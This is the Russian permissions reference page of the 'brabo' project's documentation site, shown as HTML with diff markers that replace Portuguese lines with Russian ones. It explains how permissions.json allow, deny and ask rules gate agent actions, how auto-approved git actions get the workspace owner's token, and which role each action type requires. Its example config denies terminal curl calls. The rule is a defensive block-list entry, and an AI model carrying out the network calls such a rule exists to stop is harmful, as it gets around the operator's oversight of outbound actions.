aria-haspopup=true aria-expanded=false role=button class=navbar__link><svg viewBox="0 0 24 24" width=20 height=20 aria-hidden=true class=iconLanguage_g_CG><path fill=currentColor d="M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v1.99h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"/></svg>Русский</a><ul class=dropdown__menu><li><a href=/brabo/dev/reference/permissions target=_self rel="noopener noreferrer" class=dropdown__link lang=pt-BR>Português (Brasil)</a><li><a href=/brabo/dev/en/reference/permissions target=_self rel="noopener noreferrer" class=dropdown__link lang=en>English</a><li><a href=/brabo/dev/ru/reference/permissions target=_self rel="noopener noreferrer" class="dropdown__link dropdown__link--active" lang=ru>Русский</a><li><a href=/brabo/dev/zh-Hans/reference/permissions target=_self rel="noopener noreferrer" class=dropdown__link lang=zh-Hans>简体中文</a></ul></div><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href=# aria-haspopup=true aria-expanded=false role=button class=navbar__link>dev</a><ul class=dropdown__menu><li><a href=https://daneiel.github.io/brabo/prd/ target=_blank rel="noopener noreferrer" class=dropdown__link>prd — estável<svg width=12 height=12 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li><a href=https://daneiel.github.io/brabo/qa/ target=_blank rel="noopener noreferrer" class=dropdown__link>qa — кандидат<svg width=12 height=12 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li><a href=https://daneiel.github.io/brabo/dev/ target=_blank rel="noopener noreferrer" class=dropdown__link>dev — em desenvolvimento ✓<svg width=12 height=12 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a></ul></div><a href=https://github.com/daneiel/brabo target=_blank rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><div class="toggle_pnX7 colorModeToggle_Dj3Z"><button class="clean-btn toggleButton_DKER toggleButtonDisabled_qzkp" type=button disabled title="системный режим" aria-label="Переключение между темным и светлым режимом (сейчас используется системный режим)"><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_MMQL lightToggleIcon_E8tM"><path fill=currentColor d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"/></svg><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_MMQL darkToggleIcon_rXjT"><path fill=currentColor d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"/></svg><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_MMQL systemToggleIcon_zwCm"><path fill=currentColor d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"/></svg></button></div><div class=navbarSearchContainer_zRAa><div class="navbar__search searchBarContainer_eGzj" dir=ltr><svg aria-hidden=true class=searchIcon_PXpx focusable=false viewBox="0 0 16 16"><path fill=currentColor d="M6.02945 10.20327a4.17382 4.17382 0 1 1 4.17382-4.17382 4.15609 4.15609 0 0 1-4.17382 4.17382Zm9.69195 4.2199-4.8225-4.82338A5.88021 5.88021 0 0 0 12.058 6.02856 6.00467 6.00467 0 1 0 9.59979 10.8989l4.82338 4.82338a.89729.89729 0 0 0 1.29912 0 .89749.89749 0 0 0-.00087-1.29909Z"/></svg><input placeholder=Поиск aria-label=Search class="navbar__search-input searchInput_xOBI" value="" /><div class="loadingRing_JccP searchBarLoadingRing_aTss"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role=presentation class=navbar-sidebar__backdrop></div></nav><div id=__docusaurus_skipToContent_fallback class="theme-layout-main main-wrapper mainWrapper_WJkx"><div class=docsWrapper_mIeg><button aria-label="Прокрутка к началу" class="clean-btn theme-back-to-top-button backToTopButton_Afc8" type=button></button><div class=docRoot_XZYc><aside class="theme-doc-sidebar-container docSidebarContainer_FPqZ"><div class=sidebarViewport_waOe><div class=sidebar_RQC4><nav aria-label="Боковая панель документации" class="menu thin-scrollbar menu_ZM4U"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/ru/><span class=categoryLinkLabel_jKch>🚀 Начните здесь</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/><span class=linkLabel_CzBh>Введение</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/getting-started><span class=linkLabel_CzBh>Первые шаги</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/tutorials/from-zero-to-deliverable><span class=linkLabel_CzBh>С нуля до готового результата</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/ru/architecture><span class=categoryLinkLabel_jKch>🏗️ Архитектура</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/architecture><span class=linkLabel_CzBh>Архитектура</span></a><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist" tabindex=0 href=/brabo/dev/ru/adr><span class=categoryLinkLabel_jKch>Решения (ADR)</span></a><button aria-label="Развернуть категорию 'Решения (ADR)'" aria-expanded=false type=button class="clean-btn menu__caret"></button></div></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/ru/business-rules><span class=categoryLinkLabel_jKch>📐 Правила</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/business-rules><span class=linkLabel_CzBh>Бизнес-правила</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/business-rules/custo><span class=linkLabel_CzBh>Стоимость и metering</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/business-rules/autenticacao><span class=linkLabel_CzBh>Аутентификация</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role=button aria-expanded=true href=/brabo/dev/ru/reference/configuration><span class=categoryLinkLabel_jKch>📖 Справочник</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/reference/configuration><span class=linkLabel_CzBh>Конфигурация</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/reference/events><span class=linkLabel_CzBh>События</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current=page tabindex=0 href=/brabo/dev/ru/reference/permissions><span class=linkLabel_CzBh>Права доступа</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/reference/artifacts><span class=linkLabel_CzBh>Артефакты</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/reference/git-providers><span class=linkLabel_CzBh>Git-провайдеры</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/reference/internal-api><span class=linkLabel_CzBh>Внутренний API</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/reference/scripts><span class=linkLabel_CzBh>Скрипты и команды</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/reference/rulesets><span class=linkLabel_CzBh>Правила репозитория (rulesets)</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/reference/paridade-de-traducao><span class=linkLabel_CzBh>Паритет переводов</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/reference/brb><span class=linkLabel_CzBh>Реестр BRB</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/security-surface><span class=linkLabel_CzBh>Открытая поверхность api</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/reference/api><span class=linkLabel_CzBh>Справочник API</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/ru/explanation/documentation-workflow><span class=categoryLinkLabel_jKch>💡 Пояснения</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true tabindex=0 href=/brabo/dev/ru/explanation/documentation-workflow><span class=categoryLinkLabel_jKch>Процесс и конвейер</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/explanation/documentation-workflow><span class=linkLabel_CzBh>Синхронизация документации</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/explanation/branching-policy><span class=linkLabel_CzBh>Политика веток</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/explanation/cadeia-de-suprimentos-do-ci><span class=linkLabel_CzBh>Цепочка поставок CI</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/explanation/gates><span class=linkLabel_CzBh>Gates и то, как они измеряются</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/explanation/observability><span class=linkLabel_CzBh>Наблюдаемость</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/explanation/modelo-de-time><span class=linkLabel_CzBh>Модель команды и поток результатов</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=false tabindex=0 href=/brabo/dev/ru/explanation/primeiro-dogfooding><span class=categoryLinkLabel_jKch>Проверки и измерения</span></a></div><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=false tabindex=0 href=/brabo/dev/ru/explanation/historico-de-fases><span class=categoryLinkLabel_jKch>История фаз</span></a></div><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=false tabindex=0 href=/brabo/dev/ru/explanation/localizacao><span class=categoryLinkLabel_jKch>Локализация</span></a></div><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=false tabindex=0 href=/brabo/dev/ru/explanation/tanstack-ai><span class=categoryLinkLabel_jKch>Технические заметки</span></a></div></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/ru/runbook><span class=categoryLinkLabel_jKch>🛠️ Эксплуатация</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/runbook><span class=linkLabel_CzBh>Руководство по эксплуатации</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/ru/glossary><span class=categoryLinkLabel_jKch>📚 Словарь</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/glossary><span class=linkLabel_CzBh>Глоссарий</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a href=https://github.com/daneiel/brabo/blob/dev/CONTRIBUTING.md target=_blank rel="noopener noreferrer" class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true><span class=categoryLinkLabel_jKch>🤝 Участие</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a href=https://github.com/daneiel/brabo/blob/dev/CONTRIBUTING.md target=_blank rel="noopener noreferrer" class="menu__link menuExternalLink_Ca3u" tabindex=0><span class=linkLabel_CzBh>Как внести вклад</span><svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a href=https://github.com/daneiel/brabo/blob/dev/SUPPORT.md target=_blank rel="noopener noreferrer" class="menu__link menuExternalLink_Ca3u" tabindex=0><span class=linkLabel_CzBh>Где попросить помощи</span><svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a href=https://github.com/daneiel/brabo/blob/dev/SECURITY.md target=_blank rel="noopener noreferrer" class="menu__link menuExternalLink_Ca3u" tabindex=0><span class=linkLabel_CzBh>Сообщить об уязвимости</span><svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a></ul></ul></nav></div></div></aside><main class=docMainContainer_ia8v><div class="container padding-top--md padding-bottom--lg"><div class=row><div class="col docItemCol_xjE4"><div class=docItemContainer_cPej><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_sZul" aria-label="Навигационная цепочка текущей страницы"><ul class=breadcrumbs><li class=breadcrumbs__item><a aria-label="Главная страница" class=breadcrumbs__link href=/brabo/dev/ru/><svg viewBox="0 0 24 24" class=breadcrumbHomeIcon_AUjL><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill=currentColor /></svg></a><li class=breadcrumbs__item><span class=breadcrumbs__link>📖 Справочник</span><li class="breadcrumbs__item breadcrumbs__item--active"><span class=breadcrumbs__link>Права доступа</span></ul></nav><div class="tocCollapsible_nbAK theme-doc-toc-mobile tocMobile_r92C"><button type=button class="clean-btn tocCollapsibleButton_hcyq">Содержание этой страницы</button></div><div class="theme-doc-markdown markdown"><header><h1>Разрешения</h1></header>
+<p>Каждое действие с внешним эффектом рождается как <code>proposed_action</code> и проходит
+здесь перед выполнением. Эта страница — точный формат и семантика; сами
+правила находятся в <a class="" href=/brabo/dev/ru/business-rules#rn-004>Бизнес-правилах</a>.</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=файл>Файл<a href=#файл class=hash-link aria-label="Прямая ссылка на Файл" title="Прямая ссылка на Файл" translate=no>​</a></h2>
+<p><code>permissions.json</code> живёт в <strong>корне рабочего пространства проекта</strong> — это
+настоящий файл на диске, версионируемый, а не колонка в базе.</p>
 <div class="language-json codeBlockContainer_Vzt9 theme-code-block" style=--prism-color:var(--syntax-text);--prism-background-color:var(--code-bg)><div class=codeBlockContent_FxwE><pre tabindex=0 class="prism-code language-json codeBlock_mqej thin-scrollbar" style=color:var(--syntax-text);background-color:var(--code-bg)><code class=codeBlockLines_uNqR><div class=token-line style=color:var(--syntax-text)><span class="token punctuation" style=color:var(--syntax-operator)>{</span><span class="token plain"></span><br/></div><div class=token-line style=color:var(--syntax-text)><span class="token plain">  </span><span class="token property" style=color:var(--syntax-type)>"allow"</span><span class="token operator" style=color:var(--syntax-operator)>:</span><span class="token plain"> </span><span class="token punctuation" style=color:var(--syntax-operator)>[</span><span class="token string" style=color:var(--syntax-string)>"Terminal(pnpm test:*)"</span><span class="token punctuation" style=color:var(--syntax-operator)>,</span><span class="token plain"> </span><span class="token string" style=color:var(--syntax-string)>"Terminal(git status)"</span><span class="token punctuation" style=color:var(--syntax-operator)>]</span><span class="token punctuation" style=color:var(--syntax-operator)>,</span><span class="token plain"></span><br/></div><div class=token-line style=color:var(--syntax-text)><span class="token plain">  </span><span class="token property" style=color:var(--syntax-type)>"deny"</span><span class="token operator" style=color:var(--syntax-operator)>:</span><span class="token plain">  </span><span class="token punctuation" style=color:var(--syntax-operator)>[</span><span class="token string" style=color:var(--syntax-string)>"Terminal(curl:*)"</span><span class="token punctuation" style=color:var(--syntax-operator)>]</span><span class="token punctuation" style=color:var(--syntax-operator)>,</span><span class="token plain"></span><br/></div><div class=token-line style=color:var(--syntax-text)><span class="token plain">  </span><span class="token property" style=color:var(--syntax-type)>"ask"</span><span class="token operator" style=color:var(--syntax-operator)>:</span><span class="token plain">   </span><span class="token punctuation" style=color:var(--syntax-operator)>[</span><span class="token string" style=color:var(--syntax-string)>"GitPush()"</span><span class="token punctuation" style=color:var(--syntax-operator)>]</span><span class="token plain"></span><br/></div><div class=token-line style=color:var(--syntax-text)><span class="token plain"></span><span class="token punctuation" style=color:var(--syntax-operator)>}</span><br/></div></code></pre></div></div>
-<p>Três listas, três significados:</p>
+<p>Три списка, три значения:</p>
 
 
 
@@ -31,26 +31,27 @@ real em disco, versionável, não uma coluna no banco.</p>
 
 
 
-<table><thead><tr><th>lista<th>significado<tbody><tr><td><code>allow</code><td><code>auto_approve</code> — a ação executa sem perguntar<tr><td><code>deny</code><td><code>deny</code> — recusada, e nada reverte isso<tr><td><code>ask</code><td><code>require_approval</code> — vai para a fila de aprovação</table>
-<p>Nenhuma lista casa? A ação fica <code>pending</code> por padrão. <strong>A ausência de regra
-nunca vira permissão.</strong></p>
-<h3 class="anchor anchorTargetStickyNavbar_PEh0" id=com-qual-credencial-a-ação-auto-aprovada-executa>Com qual credencial a ação auto-aprovada executa<a href=#com-qual-credencial-a-ação-auto-aprovada-executa class=hash-link aria-label="Прямая ссылка на Com qual credencial a ação auto-aprovada executa" title="Прямая ссылка на Com qual credencial a ação auto-aprovada executa" translate=no>​</a></h3>
-<p><code>auto_approve</code> quer dizer que <strong>ninguém decidiu</strong> —
-<code>proposed_actions.decided_by</code> fica <code>NULL</code>. Isso importa para quem executa:
-uma ação de git contra um provider remoto precisa de um token, e "o token de
-quem decidiu" não existe neste caminho.</p>
-<p>A resposta é o <strong>owner do workspace</strong> (<a href=/brabo/dev/ru/business-rules/custo#rn-082 target=_blank rel="noopener noreferrer" class="">RN-082</a>),
-o mesmo da chave de LLM (<a href=/brabo/dev/ru/business-rules/custo#rn-058 target=_blank rel="noopener noreferrer" class="">RN-058</a>) — quem
-financia a conta financia os agentes, e isso não muda conforme quem clica.</p>
-<p>Vale saber porque a alternativa falha calada: enquanto a api resolvia por
-<code>decided_by</code>, <strong>toda PR auto-aprovada em repositório remoto morria</strong> com
-<code>Requires authentication</code>, e só quando um humano clicava em cada uma o
-caminho funcionava — exatamente a escada que a autonomia existe para evitar.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=o-formato-do-padrão>O formato do padrão<a href=#o-formato-do-padrão class=hash-link aria-label="Прямая ссылка на O formato do padrão" title="Прямая ссылка на O formato do padrão" translate=no>​</a></h2>
+<table><thead><tr><th>список<th>значение<tbody><tr><td><code>allow</code><td><code>auto_approve</code> — действие выполняется без вопроса<tr><td><code>deny</code><td><code>deny</code> — отклонено, и ничто этого не отменяет<tr><td><code>ask</code><td><code>require_approval</code> — уходит в очередь одобрения</table>
+<p>Ни один список не совпал? Действие по умолчанию остаётся <code>pending</code>.
+<strong>Отсутствие правила никогда не становится разрешением.</strong></p>
+<h3 class="anchor anchorTargetStickyNavbar_PEh0" id=с-какими-учётными-данными-выполняется-автоодобренное-действие>С какими учётными данными выполняется автоодобренное действие<a href=#с-какими-учётными-данными-выполняется-автоодобренное-действие class=hash-link aria-label="Прямая ссылка на С какими учётными данными выполняется автоодобренное действие" title="Прямая ссылка на С какими учётными данными выполняется автоодобренное действие" translate=no>​</a></h3>
+<p><code>auto_approve</code> означает, что <strong>никто не решал</strong>, —
+<code>proposed_actions.decided_by</code> остаётся <code>NULL</code>. Это важно для исполнителя:
+действию git против удалённого провайдера нужен токен, а «токена того, кто
+решил» на этом пути не существует.</p>
+<p>Ответ — <strong>owner рабочего пространства</strong> (<a class="" href=/brabo/dev/ru/business-rules/custo#rn-082>RN-082</a>),
+тот же, что и для ключа LLM (<a class="" href=/brabo/dev/ru/business-rules/custo#rn-058>RN-058</a>), — кто
+оплачивает счёт, тот оплачивает агентов, и это не меняется в зависимости от
+того, кто нажимает.</p>
+<p>Это стоит знать, потому что альтернатива ломается молча: пока api определяла
+по <code>decided_by</code>, <strong>каждый автоодобренный PR в удалённом репозитории умирал</strong> с
+<code>Requires authentication</code>, и путь работал, только когда человек нажимал на
+каждый из них, — ровно та лестница, которой автономия призвана избегать.</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=формат-шаблона>Формат шаблона<a href=#формат-шаблона class=hash-link aria-label="Прямая ссылка на Формат шаблона" title="Прямая ссылка на Формат шаблона" translate=no>​</a></h2>
 <div class="language-text codeBlockContainer_Vzt9 theme-code-block" style=--prism-color:var(--syntax-text);--prism-background-color:var(--code-bg)><div class=codeBlockContent_FxwE><pre tabindex=0 class="prism-code language-text codeBlock_mqej thin-scrollbar" style=color:var(--syntax-text);background-color:var(--code-bg)><code class=codeBlockLines_uNqR><div class=token-line style=color:var(--syntax-text)><span class="token plain">Label(content)</span><br/></div></code></pre></div></div>
-<p>O rótulo é o tipo de ação em PascalCase. O conteúdo só é usado em
-<code>Terminal</code>; nos outros tipos ele precisa ser <strong>vazio</strong> — <code>GitPush()</code> casa com
-qualquer push, e <code>GitPush(algo)</code> não casa com nada.</p>
+<p>Метка — это тип действия в PascalCase. Содержимое используется только в
+<code>Terminal</code>; в остальных типах оно должно быть <strong>пустым</strong> — <code>GitPush()</code>
+совпадает с любым push, а <code>GitPush(algo)</code> не совпадает ни с чем.</p>
 
 
 
@@ -161,86 +162,89 @@ qualquer push, e <code>GitPush(algo)</code> não casa com nada.</p>
 
 
 
-<table><thead><tr><th>tipo de ação<th>rótulo<th>papel mínimo<tbody><tr><td><code>terminal</code><td><code>Terminal</code><td>developer<tr><td><code>git_commit</code><td><code>GitCommit</code><td>developer<tr><td><code>write_file</code><td><code>WriteFile</code><td>developer<tr><td><code>git_push</code><td><code>GitPush</code><td>maintainer<tr><td><code>pr_open</code><td><code>PrOpen</code><td>maintainer<tr><td><code>git_repo_create</code><td><code>GitRepoCreate</code><td>maintainer<tr><td><code>git_branch_create</code><td><code>GitBranchCreate</code><td>maintainer<tr><td><code>git_branch_protect</code><td><code>GitBranchProtect</code><td>maintainer<tr><td><code>open_adr_pr</code><td><code>OpenAdrPr</code><td>maintainer<tr><td><code>open_infra_pr</code><td><code>OpenInfraPr</code><td>maintainer<tr><td><code>git_merge</code><td><code>GitMerge</code><td>maintainer<tr><td><code>instruction_patch</code><td><code>InstructionPatch</code><td>maintainer<tr><td><code>parallelize</code><td><code>Parallelize</code><td>maintainer<tr><td><code>raise_max_parallel</code><td><code>RaiseMaxParallel</code><td>maintainer<tr><td><code>propose_execution_plan</code><td><code>ProposeExecutionPlan</code><td>maintainer<tr><td><code>assess_implementability</code><td><code>AssessImplementability</code><td>maintainer<tr><td><code>container_start</code><td><code>ContainerStart</code><td>maintainer<tr><td><code>container_stop</code><td><code>ContainerStop</code><td>maintainer<tr><td><code>container_remove</code><td><code>ContainerRemove</code><td>maintainer<tr><td><code>spend</code><td><code>Spend</code><td><strong>owner</strong></table>
-<p>O papel mínimo é conferido <strong>antes</strong> do arquivo. Sem ele, <code>deny</code> — o
-<code>permissions.json</code> não concede o que o IAM nega</p>
-<p><code>parallelize</code> (Fase 14d) é o único cujo efeito não é tocar código ou
-repositório: ele pede mais AGENTES. Está em <code>maintainer</code> pelo mesmo motivo de
-<code>spend</code> — quem autoriza custo é quem responde pelo projeto. Ele só existe
-acima do teto do lead; dentro dele não há ação, porque não há nada a decidir
-(<a href=/brabo/dev/ru/business-rules/custo#rn-083 target=_blank rel="noopener noreferrer" class="">RN-083</a>)
-(<a href=/brabo/dev/ru/business-rules#rn-005 target=_blank rel="noopener noreferrer" class="">RN-005</a>).</p>
